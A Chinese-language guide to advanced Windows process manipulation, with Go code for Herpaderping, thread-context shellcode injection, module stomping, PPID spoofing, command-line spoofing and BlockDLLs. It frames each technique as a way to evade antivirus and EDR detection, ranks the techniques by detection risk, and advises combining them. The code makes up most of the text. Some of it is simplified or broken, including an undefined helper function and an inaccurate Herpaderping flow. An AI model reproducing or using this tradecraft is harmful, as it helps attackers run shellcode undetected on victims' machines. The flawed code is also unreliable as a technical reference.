# 进程操控高级技术

## 1. Herpaderping（文件擦除执行）

**原理：**
- 创建进程时立即擦除源文件
- 文件内容被替换为随机数据
- 防止杀软从文件提取特征
- 进程仍在内存中运行

```go
package main

import (
    "golang.org/x/sys/windows"
    "syscall"
    "unsafe"
    "os"
)

// Herpaderping执行
func herpaderpingExecution(targetExe string, shellcode []byte) error {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    
    CreateFile := kernel32.NewProc("CreateFileW")
    WriteFile := kernel32.NewProc("WriteFile")
    CreateProcess := kernel32.NewProc("CreateProcessW")
    
    // 1. 创建临时文件
    tempPath := "C:\\Temp\\herpaderping.exe"
    tempPathPtr := syscall.StringToUTF16Ptr(tempPath)
    
    hFile, _, _ := CreateFile.Call(
        uintptr(unsafe.Pointer(tempPathPtr)),
        0x40000000, // GENERIC_WRITE
        0, 0, 1,    // CREATE_NEW
        0x80,       // FILE_ATTRIBUTE_NORMAL
        0)
    
    // 2. 写入shellcode（或原始exe）
    var bytesWritten uint32
    WriteFile.Call(hFile, uintptr(unsafe.Pointer(&shellcode[0])),
        uintptr(len(shellcode)), uintptr(unsafe.Pointer(&bytesWritten)), 0)
    
    windows.CloseHandle(windows.Handle(hFile))
    
    // 3. 创建进程（使用临时文件）
    var si windows.StartupInfo
    var pi windows.ProcessInformation
    si.Size = uint32(unsafe.Sizeof(si))
    
    CreateProcess.Call(0, uintptr(unsafe.Pointer(tempPathPtr)),
        0, 0, false, 0, 0, 0,
        uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)))
    
    // 4. 立即打开文件并擦除内容
    hFile, _, _ = CreateFile.Call(
        uintptr(unsafe.Pointer(tempPathPtr)),
        0x40000000|0x80000000, // GENERIC_WRITE | GENERIC_READ
        0, 0, 3,               // OPEN_EXISTING
        0, 0)
    
    // 5. 写入随机数据覆盖原文件（使用简单伪随机）
    randomData := make([]byte, len(shellcode))
    for i := 0; i < len(shellcode); i++ {
        randomData[i] = byte((i * 17 + 31) % 256)
    }
    
    WriteFile.Call(hFile, uintptr(unsafe.Pointer(&randomData[0])),
        uintptr(len(randomData)), uintptr(unsafe.Pointer(&bytesWritten)), 0)
    
    // 6. 修改文件大小为0
    SetEndOfFile := kernel32.NewProc("SetEndOfFile")
    SetEndOfFile.Call(hFile)
    
    windows.CloseHandle(windows.Handle(hFile))
    
    // 7. 删除文件
    os.Remove(tempPath)
    
    // 进程仍在运行，但文件已不存在
    return nil
}
```

---

## 2. 无线程注入（Threadless Injection）

**原理：**
- 不创建新线程执行shellcode
- 修改目标进程的现有线程上下文
- 设置RIP指向shellcode地址
- 等待线程自然执行到shellcode

```go
// 无线程注入：修改现有线程执行
func threadlessInjection(pid uint32, shellcode []byte) error {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    ntdll := windows.NewLazySystemDLL("ntdll.dll")
    
    OpenProcess := kernel32.NewProc("OpenProcess")
    VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
    WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
    
    NtGetNextThread := ntdll.NewProc("NtGetNextThread")
    NtQueryInformationThread := ntdll.NewProc("NtQueryInformationThread")
    NtSetInformationThread := ntdll.NewProc("NtSetInformationThread")
    
    // 1. 打开目标进程
    process, _, _ := OpenProcess.Call(0x1F0FFF, 0, uintptr(pid))
    
    // 2. 分配内存写入shellcode
    addr, _, _ := VirtualAllocEx.Call(process, 0, uintptr(len(shellcode)), 0x3000, 0x40)
    WriteProcessMemory.Call(process, addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), 0)
    
    // 3. 获取目标进程的一个线程
    var threadHandle uintptr
    NtGetNextThread.Call(process, 0, uintptr(unsafe.Pointer(&threadHandle)), 
        0x1F0FFF, 0, 0)
    
    // 4. 获取线程上下文
    var ctx CONTEXT64
    ctx.ContextFlags = 0x10001F // CONTEXT_FULL
    
    GetThreadContext := kernel32.NewProc("GetThreadContext")
    GetThreadContext.Call(threadHandle, uintptr(unsafe.Pointer(&ctx)))
    
    // 5. 保存原始RIP
    originalRip := ctx.Rip
    
    // 6. 修改RIP指向shellcode
    ctx.Rip = addr
    
    // 7. 设置新上下文
    SetThreadContext := kernel32.NewProc("SetThreadContext")
    SetThreadContext.Call(threadHandle, uintptr(unsafe.Pointer(&ctx)))
    
    // 8. 等待shellcode执行
    
    // 9. 恢复原始RIP（可选）
    ctx.Rip = originalRip
    SetThreadContext.Call(threadHandle, uintptr(unsafe.Pointer(&ctx)))
    
    windows.CloseHandle(windows.Handle(process))
    windows.CloseHandle(windows.Handle(threadHandle))
    
    return nil
}

type CONTEXT64 struct {
    P1Home         uint64
    P2Home         uint64
    P3Home         uint64
    P4Home         uint64
    P5Home         uint64
    P6Home         uint64
    ContextFlags   uint32
    MxCsr          uint32
    SegCs          uint16
    SegDs          uint16
    SegEs          uint16
    SegFs          uint16
    SegGs          uint16
    SegSs          uint16
    EFlags         uint32
    Dr0            uint64
    Dr1            uint64
    Dr2            uint64
    Dr3            uint64
    Dr6            uint64
    Dr7            uint64
    Rax            uint64
    Rbx            uint64
    Rcx            uint64
    Rdx            uint64
    Rsi            uint64
    Rdi            uint64
    R8             uint64
    R9             uint64
    R10            uint64
    R11            uint64
    R12            uint64
    R13            uint64
    R14            uint64
    R15            uint64
    Rbp            uint64
    Rip            uint64
    Rsp            uint64
    SegSs2         uint16
    Padding        [2]byte
}
```

---

## 3. 模块踩踏（Module Stomping）

**原理：**
- 在目标进程已加载的DLL中写入shellcode
- 利用现有DLL的合法内存区域
- 不分配新内存，规避内存分配检测
- 覆盖DLL代码段执行shellcode

```go
// 模块踩踏：在已加载DLL中写入shellcode
func moduleStomping(pid uint32, shellcode []byte) error {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    
    OpenProcess := kernel32.NewProc("OpenProcess")
    VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
    VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
    WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
    CreateRemoteThread := kernel32.NewProc("CreateRemoteThread")
    
    // 1. 打开目标进程
    process, _, _ := OpenProcess.Call(0x1F0FFF, 0, uintptr(pid))
    
    // 2. 获取目标进程中已加载DLL的基址（如kernel32.dll）
    // 需要枚举目标进程的模块列表
    dllBase := getRemoteModuleBase(windows.Handle(process), "kernel32.dll")
    
    // 3. 计算DLL代码段偏移（通常在.text段）
    // 选择DLL中不太重要的代码区域
    stompingAddr := dllBase + 0x1000 // 示例：DLL代码段偏移
    
    // 4. 修改内存保护为RWX
    var oldProtect uint32
    VirtualProtectEx.Call(process, stompingAddr, uintptr(len(shellcode)),
        0x40, uintptr(unsafe.Pointer(&oldProtect)))
    
    // 5. 写入shellcode（踩踏DLL代码）
    WriteProcessMemory.Call(process, stompingAddr,
        uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), 0)
    
    // 6. 恢复内存保护为RX
    VirtualProtectEx.Call(process, stompingAddr, uintptr(len(shellcode)),
        0x20, uintptr(unsafe.Pointer(&oldProtect)))
    
    // 7. 创建线程执行（线程入口在踩踏的DLL区域）
    CreateRemoteThread.Call(process, 0, 0, stompingAddr, 0, 0, 0)
    
    windows.CloseHandle(windows.Handle(process))
    
    return nil
}

// 获取远程进程模块基址
func getRemoteModuleBase(process windows.Handle, moduleName string) uintptr {
    // 使用EnumProcessModulesEx或手动遍历PEB
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    
    // 简化版本：假设目标进程和当前进程DLL基址相同
    // 实际上需要通过CreateToolhelp32Snapshot枚举
    return getModuleHandleByPEB(moduleName)
}
```

---

## 4. PPID欺骗（Parent Process ID Spoofing）

**原理：**
- 让进程看起来由指定父进程创建
- 规避基于进程链的检测
- 使用PROC_THREAD_ATTRIBUTE_PARENT_PROCESS

```go
// PPID欺骗：指定父进程
func ppidSpoofing(parentPid uint32, targetExe string, shellcode []byte) error {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    ntdll := windows.NewLazySystemDLL("ntdll.dll")
    
    OpenProcess := kernel32.NewProc("OpenProcess")
    InitializeProcThreadAttributeList := kernel32.NewProc("InitializeProcThreadAttributeList")
    UpdateProcThreadAttribute := kernel32.NewProc("UpdateProcThreadAttribute")
    CreateProcess := kernel32.NewProc("CreateProcessW")
    
    // 1. 打开父进程
    parentProcess, _, _ := OpenProcess.Call(0x1F0FFF, 0, uintptr(parentPid))
    
    // 2. 初始化属性列表
    var attrListSize uintptr
    InitializeProcThreadAttributeList.Call(0, 1, 0, uintptr(unsafe.Pointer(&attrListSize)))
    
    attrList := make([]byte, attrListSize)
    InitializeProcThreadAttributeList.Call(uintptr(unsafe.Pointer(&attrList[0])), 1, 0, uintptr(unsafe.Pointer(&attrListSize)))
    
    // 3. 设置父进程属性
    UpdateProcThreadAttribute.Call(
        uintptr(unsafe.Pointer(&attrList[0])),
        0,
        0x00020000, // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
        uintptr(unsafe.Pointer(&parentProcess)),
        unsafe.Sizeof(parentProcess),
        0, 0)
    
    // 4. 创建STARTUPINFOEX结构
    var siEx STARTUPINFOEX
    siEx.StartupInfo.Size = uint32(unsafe.Sizeof(siEx))
    siEx.AttributeList = uintptr(unsafe.Pointer(&attrList[0]))
    
    // 5. 创建进程（指定父进程）
    var pi windows.ProcessInformation
    targetExePtr := syscall.StringToUTF16Ptr(targetExe)
    
    CreateProcess.Call(0, uintptr(unsafe.Pointer(targetExePtr)),
        0, 0, false,
        0x00040000, // EXTENDED_STARTUPINFO_PRESENT
        0, 0,
        uintptr(unsafe.Pointer(&siEx)),
        uintptr(unsafe.Pointer(&pi)))
    
    // 6. 清理
    DeleteProcThreadAttributeList := kernel32.NewProc("DeleteProcThreadAttributeList")
    DeleteProcThreadAttributeList.Call(uintptr(unsafe.Pointer(&attrList[0])))
    
    windows.CloseHandle(windows.Handle(parentProcess))
    
    // 7. 在新进程中注入shellcode...
    
    return nil
}

type STARTUPINFOEX struct {
    StartupInfo    windows.StartupInfo
    AttributeList  uintptr
}
```

---

## 5. 参数欺骗（命令行参数欺骗）

**原理：**
- CreateProcess时传递一个命令行参数
- 实际执行的命令行不同
- 规避基于命令行的检测

```go
// 参数欺骗：显示的命令行和实际不同
func commandLineSpoofing(targetExe string, fakeArgs string, realArgs string) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    CreateProcess := kernel32.NewProc("CreateProcessW")
    
    // 1. 创建可修改的命令行缓冲区
    cmdLine := syscall.StringToUTF16(fakeArgs)
    
    // 2. 创建进程
    var si windows.StartupInfo
    var pi windows.ProcessInformation
    
    CreateProcess.Call(0, uintptr(unsafe.Pointer(&cmdLine[0])),
        0, 0, false, 0, 0, 0,
        uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)))
    
    // 3. 修改PEB中的命令行参数（运行时）
    // 需要写入目标进程的PEB结构
    
    // 4. 或者：在分配的命令行缓冲区中写入真实参数
    // 进程启动后会读取修改后的参数
    
    windows.CloseHandle(pi.Process)
    windows.CloseHandle(pi.Thread)
}
```

---

## 6. BlockDLLs（阻止非微软DLL加载）

**原理：**
- 设置进程属性阻止非微软签名DLL加载
- 防止杀软DLL注入进程
- 使用PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY

```go
// BlockDLLs：阻止非微软DLL
func createProcessWithBlockDLLs(targetExe string) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    
    InitializeProcThreadAttributeList := kernel32.NewProc("InitializeProcThreadAttributeList")
    UpdateProcThreadAttribute := kernel32.NewProc("UpdateProcThreadAttribute")
    CreateProcess := kernel32.NewProc("CreateProcessW")
    
    // 1. 初始化属性列表
    var attrListSize uintptr
    InitializeProcThreadAttributeList.Call(0, 2, 0, uintptr(unsafe.Pointer(&attrListSize)))
    
    attrList := make([]byte, attrListSize)
    InitializeProcThreadAttributeList.Call(uintptr(unsafe.Pointer(&attrList[0])), 2, 0, uintptr(unsafe.Pointer(&attrListSize)))
    
    // 2. 设置BlockDLL策略
    blockDLLsPolicy := uintptr(0x00000002) // BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
    UpdateProcThreadAttribute.Call(
        uintptr(unsafe.Pointer(&attrList[0])),
        0,
        0x00020007, // PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY
        uintptr(unsafe.Pointer(&blockDLLsPolicy)),
        unsafe.Sizeof(blockDLLsPolicy),
        0, 0)
    
    // 3. 创建进程
    var siEx STARTUPINFOEX
    siEx.StartupInfo.Size = uint32(unsafe.Sizeof(siEx))
    siEx.AttributeList = uintptr(unsafe.Pointer(&attrList[0]))
    
    var pi windows.ProcessInformation
    targetExePtr := syscall.StringToUTF16Ptr(targetExe)
    
    CreateProcess.Call(0, uintptr(unsafe.Pointer(targetExePtr)),
        0, 0, false,
        0x00040000, // EXTENDED_STARTUPINFO_PRESENT
        0, 0,
        uintptr(unsafe.Pointer(&siEx)),
        uintptr(unsafe.Pointer(&pi)))
    
    // 清理
    DeleteProcThreadAttributeList := kernel32.NewProc("DeleteProcThreadAttributeList")
    DeleteProcThreadAttributeList.Call(uintptr(unsafe.Pointer(&attrList[0])))
}
```

---

## 7. 技术对比

| 技术 | 检测风险 | 实现难度 | 适用场景 |
|------|----------|----------|----------|
| Herpaderping | 低 | 中 | 单文件执行 |
| 无线程注入 | 低 | 高 | 已有进程注入 |
| 模块踩踏 | 低 | 中 | 隐藏内存分配 |
| PPID欺骗 | 中 | 中 | 进程链伪装 |
| 参数欺骗 | 中 | 低 | 命令行检测规避 |
| BlockDLLs | 低 | 低 | 阻止DLL注入 |

---

## 8. 注意事项

1. **权限要求**：需要PROCESS_ALL_ACCESS等权限
2. **兼容性**：部分API在不同Windows版本行为不同
3. **稳定性**：模块踩踏可能导致目标进程崩溃
4. **检测规避**：组合使用效果更好
5. **清理**：使用后释放资源，避免泄漏